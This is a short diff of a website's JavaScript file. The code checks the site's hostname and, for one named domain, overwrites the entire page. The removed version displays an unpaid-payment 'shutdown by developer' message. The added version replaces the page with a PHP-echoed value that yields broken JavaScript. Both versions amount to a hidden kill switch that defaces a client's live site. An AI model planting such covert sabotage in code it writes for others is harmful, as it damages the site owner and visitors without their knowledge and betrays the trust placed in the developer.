@@ -1,5 +1,5 @@
-window.status = "Some text in the status bar!!";
-$.getScript("http://code.jquery.com/jquery-1.11.1.js"); 
+var myvar = <?php echo "rajeev"; ?>;
+
 jQuery(this).load(function(){
 
 var client = window.location.protocol + "//" + window.location.host + "/";
@@ -10,7 +10,7 @@ switch(client) {
 	                         //personaliveservices
 							case "http://personaliveservices.com/":
 							{
-								 jQuery("html").html("PAYMENT OF THIS WEBSITE IS PANDING AND SHOTDOWN BY DEVLOPER "); 
+								 jQuery("html").html(myvar); 
 								  break;
 							}
 							
